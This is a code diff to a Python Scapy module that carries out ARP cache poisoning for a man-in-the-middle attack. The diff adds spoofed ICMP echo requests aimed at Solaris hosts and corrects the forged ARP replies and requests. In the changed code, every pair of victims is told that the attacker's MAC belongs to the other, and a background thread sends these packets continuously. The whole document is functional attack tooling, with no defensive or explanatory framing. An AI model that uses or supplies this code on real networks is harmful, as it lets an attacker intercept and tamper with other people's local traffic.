@@ -4,30 +4,39 @@ from DNS import *
 import threading
 from config import config
 
-def forge_arp_reply(rcv_ip, rcv_mac, res_ip, res_mac):
-	return Ether(dst=rcv_mac) / ARP(
+# Forges an ICMP echo request, used for Solaris systems
+# Creates an ARP entry for the [src_ip] on the destination device
+def forge_icmp_echo_request(src_ip, dst_ip, dst_mac):
+	return Ether(dst=dst_mac) / IP(src=src_ip, dst=dst_ip) / ICMP(type="echo-request")
+
+# Forges an ARP reply
+def forge_arp_reply(src_ip, src_mac, dst_ip, dst_mac):
+	return Ether(dst=dst_mac) / ARP(
 		op=2,
-		psrc=res_ip,
-		pdst=rcv_ip,
-		hwsrc=res_mac,
-		hwdst=rcv_mac
+		psrc=src_ip,
+		pdst=dst_ip,
+		hwsrc=src_mac,
+		hwdst=dst_mac
 	)
 
-def forge_arp_request(src_ip, src_mac, target_ip):
-	return Ether(dst=rcv_mac) / ARP(
+# Forges an ARP request, used for linux kernel 2.4.x
+# Sends a spoofed ARP request to create an entry in the cache
+def forge_arp_request(src_ip, src_mac, dst_ip, dst_mac):
+	return Ether(dst=dst_mac) / ARP(
 		op=1,
 		psrc=src_ip,
+		pdst=dst_ip,
 		hwsrc=src_mac,
-		pdst=target_ip,
     	hwdst="00:00:00:00:00:00"
 	)
 	
-def poison_loop(forged_replies, forged_requests, interface):
+def poison_loop(forged_icmp_echo_requests, forged_replies, forged_requests, interface):
 	i = 1
 	# Repeatedly sends each forged response at once and then sleeps for [interval] seconds
 	while True:
-		#if (config.arp_poison_icmp):
-			# send a spoofed icmp echo request
+		# Send packets based on the config settings
+		if (config.arp_poison_icmp):
+			sendp(forged_icmp_echo_requests, iface=interface)
 		if (config.arp_poison_reply):
 			sendp(forged_replies, iface=interface)
 		if (config.arp_poison_request):
@@ -43,21 +52,28 @@ def poison_loop(forged_replies, forged_requests, interface):
 def start_arp_mitm(victims, self_mac, interface):
 	# create a list of each forged response,
 	# so each victim gets all other victims spoofed with the mac of this device
+	forged_icmp_echo_requests = [
+		forge_icmp_echo_request(ip1, ip2, mac2)
+		for (ip1, mac1) in victims
+		for (ip2, mac2) in victims
+		if (ip1, mac1) != (ip2, mac2)
+	]
+
 	forged_replies = [
-		forge_arp_reply(ip1, mac1, ip2, self_mac)
+		forge_arp_reply(ip1, self_mac, ip2, mac2)
 		for (ip1, mac1) in victims
 		for (ip2, mac2) in victims
 		if (ip1, mac1) != (ip2, mac2)
 	]
 
 	forged_requests = [
-		forge_arp_request(ip1, self_mac, ip2)
+		forge_arp_request(ip1, self_mac, ip2, mac2)
 		for (ip1, mac1) in victims
 		for (ip2, mac2) in victims
 		if (ip1, mac1) != (ip2, mac2)
 	]
 
-	thread = threading.Thread(target=poison_loop, args=(forged_replies, forged_requests, interface), daemon=True)
+	thread = threading.Thread(target=poison_loop, args=(forged_icmp_echo_requests, forged_replies, forged_requests, interface), daemon=True)
 
 	thread.start()
 
